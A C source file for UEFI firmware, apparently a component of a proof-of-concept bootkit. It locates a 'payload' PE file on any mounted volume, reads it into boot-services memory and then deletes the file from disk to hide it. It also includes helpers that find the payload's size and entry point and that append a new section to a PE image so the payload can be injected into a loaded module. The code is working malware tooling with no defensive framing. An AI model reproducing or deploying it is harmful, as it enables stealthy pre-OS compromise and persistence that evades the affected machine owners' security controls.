#include "PayLoad.h"

// this can also just be set at compile time if you want too, but for PoC im going
// to read the payload from disk and delete it after...
VOID* PayLoad = NULL;

UINT32 PayLoadSize(VOID)
{
	EFI_IMAGE_DOS_HEADER* RecordDosImageHeader = PayLoad;
	if (RecordDosImageHeader->e_magic != EFI_IMAGE_DOS_SIGNATURE)
		return NULL;

	EFI_IMAGE_NT_HEADERS64* RecordNtHeaders = (UINT64)RecordDosImageHeader + RecordDosImageHeader->e_lfanew;
	if (RecordNtHeaders->Signature != EFI_IMAGE_NT_SIGNATURE)
		return NULL;

	return RecordNtHeaders->OptionalHeader.SizeOfImage + 0x1000;
}

VOID* PayLoadEntry(VOID* ModuleBase)
{
	EFI_IMAGE_DOS_HEADER* RecordDosImageHeader = PayLoad;
	if (RecordDosImageHeader->e_magic != EFI_IMAGE_DOS_SIGNATURE)
		return NULL;

	EFI_IMAGE_NT_HEADERS64* RecordNtHeaders = (UINT64)RecordDosImageHeader + RecordDosImageHeader->e_lfanew;
	if (RecordNtHeaders->Signature != EFI_IMAGE_NT_SIGNATURE)
		return NULL;

	return (UINT64)ModuleBase + RecordNtHeaders->OptionalHeader.AddressOfEntryPoint;
}

// programmed by: hMihaiDavid
// taken from: https://github.com/hMihaiDavid/addscn/blob/master/addscn/addscn.cpp#L89
VOID* AddSection(VOID* ImageBase, CHAR8* SectionName, UINT32 VirtualSize, UINT32 Characteristics)
{
	EFI_IMAGE_DOS_HEADER* dosHeader = (EFI_IMAGE_DOS_HEADER*)ImageBase;
	EFI_IMAGE_NT_HEADERS64* ntHeaders = (EFI_IMAGE_NT_HEADERS64*)((UINT64)ImageBase + dosHeader->e_lfanew);

	UINT16 sizeOfOptionalHeader = ntHeaders->FileHeader.SizeOfOptionalHeader;
	EFI_IMAGE_FILE_HEADER* fileHeader = &(ntHeaders->FileHeader);

	EFI_IMAGE_SECTION_HEADER* firstSectionHeader = 
		(EFI_IMAGE_SECTION_HEADER*)(((UINT64)fileHeader) + 
			sizeof(EFI_IMAGE_FILE_HEADER) + sizeOfOptionalHeader);

	UINT32 numberOfSections = ntHeaders->FileHeader.NumberOfSections;
	UINT32 sectionAlignment = ntHeaders->OptionalHeader.SectionAlignment;
	UINT32 fileAlignment = ntHeaders->OptionalHeader.FileAlignment;

	EFI_IMAGE_SECTION_HEADER* newSectionHeader = &firstSectionHeader[numberOfSections];
	EFI_IMAGE_SECTION_HEADER* lastSectionHeader = &firstSectionHeader[numberOfSections - 1];

	MemCopy(&newSectionHeader->Name, SectionName, AsciiStrLen(SectionName));
	newSectionHeader->Misc.VirtualSize = VirtualSize;
	newSectionHeader->VirtualAddress = 
		P2ALIGNUP(lastSectionHeader->VirtualAddress + 
			lastSectionHeader->Misc.VirtualSize, sectionAlignment);

	newSectionHeader->SizeOfRawData = P2ALIGNUP(VirtualSize, fileAlignment);
	newSectionHeader->Characteristics = Characteristics;

	newSectionHeader->PointerToRawData = 
		(UINT32)(lastSectionHeader->PointerToRawData +
			lastSectionHeader->SizeOfRawData);

	++ntHeaders->FileHeader.NumberOfSections;
	ntHeaders->OptionalHeader.SizeOfImage = 
		P2ALIGNUP(newSectionHeader->VirtualAddress + 
			newSectionHeader->Misc.VirtualSize, sectionAlignment);

	return ((UINT64)ImageBase) + newSectionHeader->VirtualAddress;
}

EFI_STATUS LoadPayLoadFromDisk(VOID** PayLoadBufferPtr)
{
	EFI_STATUS Result = EFI_SUCCESS;
	UINTN HandleCount = NULL;
	EFI_HANDLE* Handles = NULL;
	EFI_FILE_HANDLE VolumeHandle;
	EFI_FILE_HANDLE PayLoadFileHandle;
	EFI_DEVICE_PATH* PayLoadDevicePath = NULL;
	EFI_FILE_IO_INTERFACE* FileSystem = NULL;
	EFI_FILE_PROTOCOL* PayLoadFile = NULL;

	if (EFI_ERROR((Result = gBS->LocateHandleBuffer(ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &HandleCount, &Handles))))
	{
		Print(L"error getting file system handles -> 0x%p\n", Result);
		return Result;
	}

	for (UINT32 Idx = 0u; Idx < HandleCount; ++Idx)
	{
		if (EFI_ERROR((Result = gBS->OpenProtocol(Handles[Idx], &gEfiSimpleFileSystemProtocolGuid, (VOID**)&FileSystem, gImageHandle, NULL, EFI_OPEN_PROTOCOL_GET_PROTOCOL))))
		{
			Print(L"error opening protocol -> 0x%p\n", Result);
			return Result;
		}

		if (EFI_ERROR((Result = FileSystem->OpenVolume(FileSystem, &VolumeHandle))))
		{
			Print(L"error opening file system -> 0x%p\n", Result);
			return Result;
		}

		if (!EFI_ERROR((Result = VolumeHandle->Open(VolumeHandle, &PayLoadFileHandle, PAYLOAD_PATH, EFI_FILE_MODE_READ, EFI_FILE_READ_ONLY))))
		{
			VolumeHandle->Close(VolumeHandle);
			PayLoadDevicePath = FileDevicePath(Handles[Idx], PAYLOAD_PATH);

			if (EFI_ERROR((Result = EfiOpenFileByDevicePath(&PayLoadDevicePath, &PayLoadFile, EFI_FILE_MODE_WRITE | EFI_FILE_MODE_READ, NULL))))
			{
				Print(L"failed to open payload file... reason -> %r\n", Result);
				return Result;
			}

			EFI_FILE_INFO* FileInfoPtr = NULL;
			UINTN FileInfoSize = NULL;

			if (EFI_ERROR((Result = PayLoadFile->GetInfo(PayLoadFile, &gEfiFileInfoGuid, &FileInfoSize, NULL))))
			{
				if (Result == EFI_BUFFER_TOO_SMALL)
				{
					gBS->AllocatePool(EfiBootServicesData, FileInfoSize, &FileInfoPtr);
					if (EFI_ERROR(Result = PayLoadFile->GetInfo(PayLoadFile, &gEfiFileInfoGuid, &FileInfoSize, FileInfoPtr)))
					{
						Print(L"get backup file information failed... reason -> %r\n", Result);
						return Result;
					}
				}
				else
				{
					Print(L"Failed to get file information... reason -> %r\n", Result);
					return Result;
				}
			}

			VOID* PayLoadBuffer = NULL;
			UINTN PayLoadSize = FileInfoPtr->FileSize;
			gBS->AllocatePool(EfiBootServicesData, FileInfoPtr->FileSize, &PayLoadBuffer);

			if (EFI_ERROR((Result = PayLoadFile->Read(PayLoadFile, &PayLoadSize, PayLoadBuffer))))
			{
				Print(L"Failed to read payload file into buffer... reason -> %r\n", Result);
				return Result;
			}

			if (EFI_ERROR((Result = PayLoadFile->Delete(PayLoadFile))))
			{
				Print(L"unable to delete payload file... reason -> %r\n", Result);
				return Result;
			}

			*PayLoadBufferPtr = PayLoadBuffer;
			gBS->FreePool(FileInfoPtr);
			return EFI_SUCCESS;
		}
	}

	Print(L"unable to find payload on disk...\n");
	return EFI_ABORTED;
}